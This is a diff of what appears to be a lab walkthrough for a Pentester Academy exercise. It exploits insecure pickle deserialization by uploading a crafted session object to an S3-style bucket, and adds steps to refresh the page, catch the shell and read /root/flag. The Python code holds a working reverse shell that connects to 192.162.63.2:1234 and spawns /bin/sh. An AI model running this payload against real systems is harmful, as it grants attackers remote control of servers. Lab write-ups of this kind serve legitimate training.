@@ -47,14 +47,23 @@ import boto3
 from botocore import UNSIGNED
 from botocore.config import Config
 class Shell(object):
-def __reduce__(self):
-return (os.system,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.162.63.2\",1234)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))
+ def __reduce__(self):
+  return (os.system,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.162.63.2\",1234)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))
 s3=boto3.client('s3',endpoint_url='http://s3.pentesteracademylab.appspot.com',config=Config(signature_version=UNSIGNED))
 pickledData=pickle.dumps(Shell())
 s3.put_object(Bucket='assets',Key='sessions/43085237187070924862845585858148322582',Body=pickledData)
 
 
 ```
+Execute the script, refresh the web page and the shell is obtained, then get the flag in `/root/flag`
+
+![image](https://user-images.githubusercontent.com/46797181/228736926-fa905399-15fc-4d7e-a4b1-e6d566899372.png)
+
+
+#### Note: When refreshing the web page, the session is killed and login screen appears again. If want to repeat the step, log in again with guest:guest, obtain the new session value in `sessions` and replace the value in the python script and execute again the script along with refreshing the page to obtan again the shell
+
+!! EXERCISE COOMPLETED 
+
 
 
 
